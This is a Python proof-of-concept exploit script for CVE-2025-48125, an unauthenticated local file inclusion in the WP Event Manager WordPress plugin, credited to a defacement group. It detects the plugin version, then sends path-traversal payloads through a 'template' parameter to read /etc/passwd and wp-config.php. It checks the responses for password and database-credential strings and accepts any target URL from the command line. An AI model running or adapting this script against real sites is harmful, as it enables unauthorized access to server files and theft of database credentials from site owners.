#!/usr/bin/env python3

import requests
import argparse
import re

requests.packages.urllib3.disable_warnings()

BANNER = r"""
/      \ /  |   /  |/        |       /      \  /      \  /      \ /       |       /  |  /  | /      \  _/  |   /      \ /       |
/$$$$$$  |$$ |   $$ |$$$$$$$$/       /$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$$/        $$ |  $$ |/$$$$$$  |/ $$ |  /$$$$$$  |$$$$$$$/

|  $$/ $$ |   $$ |$$ |__          $$____$$ |$$$  \$$ |$$____$$ |$$ |____        $$ |__$$ |$$ \__$$ |$$$$ |  $$____$$ |$$ |____            
$$ |      $$  \ /$$/ $$    |          /    $$/ $$$$  $$ | /    $$/ $$      \       $$    $$ |$$    $$<   $$ |   /    $$/ $$      \           
$$ |   __  $$  /$$/  $$$$$/          /$$$$$$/  $$ $$ $$ |/$$$$$$/  $$$$$$$  |      $$$$$$$$ | $$$$$$  |  $$ |  /$$$$$$/  $$$$$$$  |          
$$ \__/  |  $$ $$/   $$ |_____       $$ |_____ $$ \$$$$ |$$ |_____ /  \__$$ |            $$ |$$ \__$$ | _$$ |_ $$ |_____ /  \__$$ |          
$$    $$/    $$$/    $$       |      $$       |$$   $$$/ $$       |$$    $$/             $$ |$$    $$/ / $$   |$$       |$$    $$/           
 $$$$$$/      $/     $$$$$$$$/       $$$$$$$$/  $$$$$$/  $$$$$$$$/  $$$$$$/              $$/  $$$$$$/  $$$$$$/ $$$$$$$$/  $$$$$$/            

CVE-2025-48125 - WP Event Manager <= 3.1.49
Unauthenticated Local File Inclusion (LFI)
by Mrj Haxcore | DefacerPH
"""

POST_SCAN_DESCRIPTION = """
------------------------------------------------------
CVE-2025-48125 - WP Event Manager POC    
Unauthenticated Local File Inclusion (LFI)    
by: Mrj Haxcore | DefacerPH     
USE THIS TOOL RESPONSIBLY
------------------------------------------------------
"""

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

FALLBACK_FILES = [
    "../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../etc/issue",
    "../../../../wp-config.php"
]

def fetch_plugin_version(base_url):
    try:
        url = f"{base_url}/wp-content/plugins/wp-event-manager/readme.txt"
        r = requests.get(url, headers=HEADERS, timeout=10, verify=False)
        if r.status_code == 200:
            match = re.search(r"Stable\s*tag\s*:\s*([0-9]+\.[0-9]+\.[0-9]+)", r.text, re.IGNORECASE)
            if match:
                return match.group(1)
    except Exception as e:
        print(f"[-] Error fetching version info: {e}")
    return None

def is_version_vulnerable(version):
    try:
        major, minor, patch = map(int, version.split("."))
        return (major, minor, patch) <= (3, 1, 49)
    except:
        return False

def test_lfi(base_url, target_file):
    payload_url = f"{base_url}/index.php?post_type=event_listing&p=1&template={target_file}"
    print(f"[+] Attempting LFI: {payload_url}")
    try:
        r = requests.get(payload_url, headers=HEADERS, timeout=10, verify=False)
        print("[*] Raw HTTP response:")
        print(r.text[:1000])  # Always show first 1000 chars
        if r.status_code == 200 and ("root:x" in r.text or "DB_PASSWORD" in r.text):
            print("[+] LFI Successful!")
            return True
        else:
            print("[-] LFI failed or no readable output.")
            return False
    except Exception as e:
        print(f"[-] Error during LFI test: {e}")
        return False

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-48125 - WP Event Manager LFI")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. https://site.com)")
    parser.add_argument("-f", "--file", default="../../../../../../../../../../etc/passwd", help="File to include (default: /etc/passwd)")
    args = parser.parse_args()
    base_url = args.url.rstrip("/")

    plugin_version = fetch_plugin_version(base_url)
    if plugin_version:
        print(f"[+] Detected plugin version: {plugin_version}")
    else:
        print("[-] Could not detect plugin version.")
        return

    if is_version_vulnerable(plugin_version):
        print("[+] Target is vulnerable. Proceeding with LFI test...")
        success = test_lfi(base_url, args.file)
        if not success:
            print("[*] Trying fallback file paths...")
            for alt_file in FALLBACK_FILES:
                print(f"[+] Trying fallback file: {alt_file}")
                if test_lfi(base_url, alt_file):
                    break
    else:
        print("[-] Target is not vulnerable based on plugin version.")

    print(POST_SCAN_DESCRIPTION)

if __name__ == "__main__":
    main()